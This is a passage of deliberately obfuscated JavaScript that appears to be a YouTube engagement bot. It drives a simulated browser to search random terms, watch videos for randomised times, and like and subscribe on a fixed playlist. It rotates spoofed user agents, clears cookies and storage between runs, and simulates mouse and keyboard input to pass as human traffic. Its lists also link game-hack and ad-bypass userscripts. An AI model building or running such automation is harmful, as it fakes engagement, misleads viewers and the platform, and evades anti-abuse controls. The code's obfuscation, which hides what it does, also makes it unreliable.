      'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=fa2e1d6f9' + 'b4b4901969' + 'a02c82d453' + '4c4&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/house-s' + 'ettling-ft' + '-danny-bro' + 'wn?si=3527' + 'c3f6b1904b' + 'edac2d3673' + 'b266b9aa&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing',
      'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=2ec72b' + 'b6d77b4a08' + 'b2e8422f68' + '55699b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g',
      'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=357e' + '7dfc02cc4e' + 'a28b94c66a' + 'f7050293&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/sisyphu' + 's?si=2646e' + 'cb7ea704ba' + '68ea2711d1' + '659e92a&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/knots?s' + 'i=c127f344' + 'b3d34c9ca8' + 'e3d7cb4679' + '18f7&utm_s' + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
      'https://so' + 'undcloud.c' + 'om/sadfros' + 'ty/beavis-' + 'butthead?s' + 'i=289d5c98' + 'ab0142b982' + '8ef6d51245' + 'b690&utm_s' + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
      'https://so' + 'undcloud.c' + 'om/tyler-w' + 'allace-62/' + 'legacy-emi' + 'nem-remix-' + '1?si=8789c' + '4ffc202403' + 'bb58d7a49a' + '59ee589&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng'
    ],
    'oujsToAssist': [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + N(0x4) + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + O(0x1, '0JQc') + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + N(0x14) + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    'oujsUAs': [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ],
    'searchTerms': []
  };

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x2651 + 0xbb7 * -0x2 + -0xee3);
    let h = e[f];
    if (b['ydSDfN'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x53c + 0x3e * -0x59 + 0x1052, s, t, u = -0xaab + -0x2024 + -0x34b * -0xd; t = n['charAt'](u++); ~t && (s = r % (0x251 + 0x1f * -0x8f + 0xf04) ? s * (-0x1152 + 0x1 * 0x166d + -0x4db) + t : t, r++ % (-0x1f * 0x5f + 0x4 * -0x4cd + 0x37 * 0x8f)) ? p += String['fromCharCode'](-0x3 * -0x905 + 0x121 * -0x11 + -0x1 * 0x6df & s >> (-(-0x1 * 0x1664 + 0x26c * 0x7 + -0x29 * -0x22) * r & 0x1014 + -0x7 * 0x21e + 0x9e * -0x2)) : 0x1715 + -0x1337 * 0x1 + -0xc6 * 0x5) {
          t = o['indexOf'](t);
        }
        for (let v = -0x1a84 + 0x371 * -0x4 + 0x1424 * 0x2, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0xb * 0x32d + 0x670 + -0x1a7 * 0x19))['slice'](-(-0x1eb0 + 0x112 * -0xa + 0x2966));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x50c + -0x76 * 0x14 + 0x42c,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x29c + -0x1b6b + 0x1 * 0x1e07; u < 0x61 * -0xe + 0x3ae + 0xc * 0x38; u++) {
          p[u] = u;
        }
        for (u = -0xb65 * -0x3 + -0x1 * 0x6d1 + -0x2 * 0xdaf; u < -0x54 * -0x65 + 0x2 * 0x3d3 + -0x1cf * 0x16; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x3e5 * -0x4 + -0x1 * -0x222b + -0x30bf * 0x1), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1cea * -0x1 + -0x130f + -0x2ff9 * -0x1, q = 0x1 * 0x185 + -0x1308 + 0x1183;
        for (let v = 0x2 * -0xf7b + -0x1695 + 0x9 * 0x5f3; v < n['length']; v++) {
          u = (u + (0x1e72 + -0x1026 * -0x1 + -0x2e97 * 0x1)) % (-0x215f * -0x1 + -0x1626 + 0x1 * -0xa39), q = (q + p[u]) % (-0x612 + 0x641 * -0x1 + 0xd53 * 0x1), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x9 * -0x77 + -0xe * -0x24f + -0x2381 * 0x1)]);
        }
        return t;
      };
      b['dkbHjM'] = m, c = arguments, b['ydSDfN'] = !![];
    }
    const j = e[-0x1 * -0xd3 + -0x2 * 0x21b + 0x33 * 0x11],
      k = f + j,
      l = c[k];
    return !l ? (b['LGajPb'] === undefined && (b['LGajPb'] = !![]), h = b['dkbHjM'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
data['searchTerm' + 's']['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), data['searchTerm' + 's']['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), data['searchTerm' + 's']['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), data['searchTerm' + 's']['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0xa1 * 0x2b + 0x1924 + -0x1 * -0x1f1)), data['searchTerm' + 's']['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x2f * 0x6b + 0x222 + -0x15bd)), data['searchTerm' + 's']['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), data['searchTerm' + 's'] = data['searchTerm' + 's']['flat'](0x510 + -0x2 * 0x1003 + -0x1af9 * -0x1);

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x2651 + 0xbb7 * -0x2 + -0xee3);
    let h = e[f];
    if (c['HEykms'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x53c + 0x3e * -0x59 + 0x1052, r, s, t = -0xaab + -0x2024 + -0x34b * -0xd; s = m['charAt'](t++); ~s && (r = q % (0x251 + 0x1f * -0x8f + 0xf04) ? r * (-0x1152 + 0x1 * 0x166d + -0x4db) + s : s, q++ % (-0x1f * 0x5f + 0x4 * -0x4cd + 0x37 * 0x8f)) ? o += String['fromCharCode'](-0x3 * -0x905 + 0x121 * -0x11 + -0x1 * 0x6df & r >> (-(-0x1 * 0x1664 + 0x26c * 0x7 + -0x29 * -0x22) * q & 0x1014 + -0x7 * 0x21e + 0x9e * -0x2)) : 0x1715 + -0x1337 * 0x1 + -0xc6 * 0x5) {
          s = n['indexOf'](s);
        }
        for (let u = -0x1a84 + 0x371 * -0x4 + 0x1424 * 0x2, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0xb * 0x32d + 0x670 + -0x1a7 * 0x19))['slice'](-(-0x1eb0 + 0x112 * -0xa + 0x2966));
        }
        return decodeURIComponent(p);
      };
      c['jdJofW'] = i, b = arguments, c['HEykms'] = !![];
    }
    const j = e[0x50c + -0x76 * 0x14 + 0x42c],
      k = f + j,
      l = b[k];
    return !l ? (h = c['jdJofW'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function a() {
  const b8 = [
    'bObEme2BDO',
    'WQhcNSktW7pdRsRcK8kulse',
    'zgL1Bs5JB20Vqa',
    'jXrMW4b9wq/cHchcIa',
    'CNrLCL9YzxnVDq',
    'xsNcNgpdRmoFW5BcKG',
    'W5ZcGYLeiSoYWR0',
    'zLOwW5xdObFdQSobacC',
    'z2vYlwPZltzJzG',
    'jSk8W7pcKZS+',
    'lwfKyMXVy2STDG',
    'uMxdNmkPWQRcICo2WPddJCoH',
    'easyfork.o',
    'zwn0B3i',
    'WPRcS35mDmovDZpcIba',
    'W7pdOCkMhauFW7FdJLHT',
    'ChjVDg90ExbL',
    'jbZdNCkcWQtdIq1dW7bW',
    'zs9KAwvWlMLV',
    'zwfZEwzVCMSUBW',
    'q2XPzw50xYHcrq',
    'rm7lNIIOQC'
  ];
  a = function() {
    return b8;
  };
  return a();
}
const HookManager = {
    'prototypes': () => {
      Array['prototype']['repeatExte' + 'nd'] = function(f) {
        let g = this,
          h = g;
        for (let i = 0x14c + -0x2 * 0x29d + -0x1f7 * -0x2; i < f; i++)
          h = h['concat'](g);
        return h;
      }, Array['prototype']['random'] = function() {
        return this[floor(random() * this['length'])];
      };
    }
  },
  arrs = new Map(),
  makeFetchCookie = require('fetch-cook' + 'ie');
HookManager['prototypes']();
const actions = [
  [
    () => flags['ActivateBr' + 'owser'],
    async () => {
      const T = d,
        S = b;
      async function f(z = '', A = -0x3 * 0xc47 + -0x1aaa * 0x1 + 0x3f8 * 0x10, B) {
        const C = await B['waitForSel' + 'ector'](z);
        return await v['simClickEl' + 'ement'](C, {
          'pauseAfterMouseUp': A
        }), C;
      }
      async function g(z) {
        const A = await z['cookies']();
        for (const B of A)
          await z['deleteCook' + 'ie'](B);
        return await z['evaluate'](() => {
          window['name'] = '', localStorage['clear'](), sessionStorage['clear']();
        }), -0x1 * -0x192b + 0x1 * 0x21d7 + -0x3b01;
      }
      async function h(z) {
        let A = await u['newPage']();
        return await A['setDefault' + 'Navigation' + 'Timeout'](0x45f + 0x142c * -0x1 + 0xfcd), await A['goto'](z, {
          'timeout': 0x0
        }), A;
      }
      async function i(z) {
        const Q = b;
        return await wait(-0x22cb + 0x11d + 0x3536), await z['waitForNet' + Q(0x5, 'iBOQ')]({
          'idleTime': 0x1d4c,
          'timeout': 0x0
        }), -0x26ec * 0x1 + 0x1b38 + 0xbb5;
      }
      async function j(z) {
        log('watching..' + '.'), await z['evaluate'](() => {
          var B;
          (B = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0xe20 + -0x1 * 0x2181 + -0x59 * -0x89, 0x1 * 0x2489 + 0x253a + 0x27 * -0x1e4), B[Math['floor'](Math['random']() * B['length'])])['setAttribu' + 'te']('id', '__scope');
        }), await f('#__scope', 0x893 + -0x3 * 0x5c9 + -0x464 * -0x2, z), await i(z);
        const A = await k(z);
        return await wait(min((-0x415b + -0x1d * -0xc83 + 0xe * -0x482) * getRandomInt(0x19ed * 0x1 + 0x47 * -0x62 + 0x13 * 0x11, 0x1 * 0x1c94 + 0x447 + -0x20d6), A)), -0x208 + 0x1 * -0x427 + 0x630;
      }
      async function k(z) {
        return await z['evaluate'](() => {
          const A = {
            'Seconds': 0x3e8,
            'Minutes': 0xea60,
            'Hours': 0x36ee80,
            'Second': 0x3e8,
            'Minute': 0xea60,
            'Hour': 0x36ee80
          };
          let B = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
            C = -0x6 * -0x2e + 0x4c + -0x160;
          B = B['split'](B['includes']('of') ? '\x20of\x20' : ',\x20')[-0x188f + -0x1138 * -0x2 + -0x9e0]['split']('\x20');
          for (let D = 0x16a6 + -0x571 + -0x1 * 0x1135; D < B['length']; D += 0x21b4 + -0x32 * 0x14 + -0x1dca)
            C += B[D] * A[B[D + (0x7d6 + -0x10cd * -0x1 + -0x18a2)]];
          return C;
        });
      }
      async function l(z) {
        log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await z['goto'](channels['random'](), {
          'timeout': 0x0
        }), await f('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)', 0x23c7 + -0x3 * 0xc51 + 0x5 * 0x3c, z), log('clicked\x20vi' + 'deo\x20stuff'), await i(z), log('page\x20netwo' + 'rk\x20idle\x20x2'), await z['evaluate'](() => {
          const C = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](E => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == E['getAttribu' + 'te']('class'))['slice'](0x9f * -0x21 + -0x13 * 0x79 + 0x1d80)['map'](E => Array['from'](E['children']))['flat'](-0x6e + -0x1 * -0x216c + -0xaff * 0x3)['map'](E => E['childNodes'][0x1d8a + -0x2205 + 0x47c]['childNodes'][-0x39 * 0x8b + 0x8 * 0x185 + -0x1 * -0x12cb]['childNodes'][-0x125d + -0xac0 + 0x2 * 0xe8f]['childNodes'][-0x227d + 0xdd9 * 0x1 + -0x14a4 * -0x1]['childNodes'][-0xc21 * 0x2 + 0x1a1 * -0xe + 0x1 * 0x2f11]);
          var D;
          return (D = C)[Math['floor'](Math['random']() * D['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), C['map'](E => E['href']);
        }), await wait(getRandomInt(-0x11 * -0xa + 0x1 * -0x6c7 + 0xa05, 0x2 * 0xb15 + 0x9 * -0x19 + 0x1c1 * -0x1)), await f('#__hookedV' + 'idToWatch', 0x1d * -0x146 + 0x2b * 0x8b + 0xd96, z), log('woah\x20click' + 'ed\x20some\x20vi' + 'deoo'), await wait(-0x26ac + -0x672e + 0xc872);
        const A = await k(z),
          B = min((-0x2 * -0x7275 + 0x35 * -0x4c5 + 0x1023f) * getRandomInt(0x458 + 0x1884 + -0x1cda, 0x3 * 0xc50 + -0xbf * 0x1b + -0x863 * 0x2), A);
        return log('Watching\x20v' + 'id\x20for\x20' + B + ('ms,\x20max\x20ti' + 'me:\x20') + A + 'ms'), await wait(B), 0x899 + -0x1 * 0x2162 + -0x13 * -0x14e;
      }
      async function m(z) {
        const R = c;
        return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await z['waitForSel' + R(0xd)]('.style-sco' + 'pe\x20ytd-ric' + 'h-grid-row'), await z['evaluate'](() => {
          var A;
          (A = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](B => 'contents' != B['id']), A[Math['floor'](Math['random']() * A['length'])])['children'][0x19 * -0x132 + 0x1545 + 0x89d]['children'][0xcaf * -0x3 + -0x2 * -0x2d1 + 0x206b]['children'][-0x1e4a * -0x1 + -0xd * -0x58 + -0x22c2]['children'][-0x1f * -0x9b + -0x130c + 0x47]['children'][0x3 * 0x665 + -0x191 + 0x119e * -0x1]['setAttribu' + 'te']('id', 'gottemezez');
        }), await f('#gottemeze' + 'z', 0x432 + -0x17f * -0x13 + -0x686 * 0x5, z), await i(z), await j(z), -0x1da1 + -0x1efc + -0x2 * -0x1e4f;
      }
      async function n(z) {
        log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await z['evaluate'](() => {
          let C = Array['from'](document['querySelec' + 'torAll']('#search'));
          document['getElement' + 'ById']('__searchBo' + 'xReal') || C['find'](D => 'INPUT' === D['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
        }), await f('#__searchB' + 'oxReal', 0x1 * 0x15a7 + -0x16be + -0x1 * -0x117, z), await v['simKeyboar' + 'dType'](searchTerms['random']() + ''), await f('#search-ic' + 'on-legacy', 0xbc5 * -0x3 + 0x1 * 0x1fc9 + 0x2 * 0x1c3, z), log('searching.' + '..'), await z['waitForFun' + 'ction']('Array.from' + '(document.' + 'getElement' + 'sByTagName' + '(\x22ytd-vide' + 'o-renderer' + '\x22)).length'), await i(z);
        let A = await z['evaluate'](() => {
          const C = {
              'seconds': 0x3e8,
              'minutes': 0xea60,
              'hours': 0x36ee80,
              'second': 0x3e8,
              'minute': 0xea60,
              'hour': 0x36ee80
            },
            D = (E = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](G => G['childNodes'][-0xebb * 0x1 + -0x9be + 0x187b]['childNodes'][-0x10be * 0x2 + -0x99a + 0xe5d * 0x3]['childNodes'][0x1c5e + -0x2588 + 0x92b]))[Math['floor'](Math['random']() * E['length'])];
          var E;
          const F = D['childNodes'][-0x8 * -0x348 + -0x1 * -0xe5c + 0x2897 * -0x1]['childNodes'][-0x23f * -0x1 + 0x928 + 0x1 * -0xb67]['childNodes'][0x2247 + -0x74 + -0x21d1]['ariaLabel'];
          return D['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'),
            function(G) {
              let H = G['split'](',\x20')['map'](J => J['split']('\x20'))['flat'](-0x26fc + -0x18ba + 0x153d * 0x3),
                I = 0x1af1 + -0x196a + 0x11 * -0x17;
              for (let J = -0x194e + 0x1c * -0x78 + -0x2 * -0x1337; J < H['length']; J += -0x7 * -0x141 + 0x4 * 0x260 + -0x1245)
                I += H[J] * C[H[J + (0x63f * -0x1 + 0x1ece + -0x188e)]];
              return I;
            }(F);
        });
        await f('#__hookedV' + 'idToClick', 0xbb + -0x1 * -0x1819 + -0x18d4, z);
        let B = min((0x118c9 + -0x1 * -0x8a55 + 0x71b * -0x1a) * getRandomInt(0x7b4 * -0x2 + 0xbee * -0x3 + 0x3333, 0x8f9 * 0x3 + 0x10aa + -0x2b8b), A + (-0xa14 + -0xa1d + 0x27b9 * 0x1));
        return log('watching\x20v' + 'ideo\x20for\x20' + B + 'ms'), await wait(B), -0x12db + -0x1 * -0x1719 + 0xd9 * -0x5;
      }
      async function o(z) {
        await z['goto']('https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + x['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y')), await f('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill', 0xab * 0x2d + 0x1b61 + -0x396f, z), await f('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill', 0x13a6 + 0x2d2 * 0x7 + -0xd21 * 0x3, z);
        const A = setInterval(async () => {
          log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await z['evaluate'](() => {
            setTimeout(() => {
              document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on') ? .['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
            }, 0x86 * 0x38 + 0xe2f + 0x1 * -0x1fc7 + (0xfd1 * -0x1 + 0x67 * -0x4a + -0x1 * -0x317f) * Math['random']());
          });
        }, 0x12c4 + 0x29e9 + -0x17 * 0x173);
        await wait(0x11c2 * -0x45 + -0x1 * -0x3659c + 0x5f78e);
        try {
          z['$']('#__lllll') && await f('#__lllll', -0x6e6 + -0xb76 + 0x125d, z);
        } catch (B) {}
        return await wait((-0xac66 + 0xed1 * -0x19 + 0x3092f * 0x1) * getRandomInt(-0x1ed0 + 0x14 * -0x1ef + 0x4580, 0x3 * -0x629 + -0x30 * -0xb2 + -0xecc)), clearInterval(A), 0x333 * 0x2 + 0x2 * 0x649 + -0x12f7;
      }
      log('index.js\x20c' + 'alled');
      const {
        FakeBrowser: p
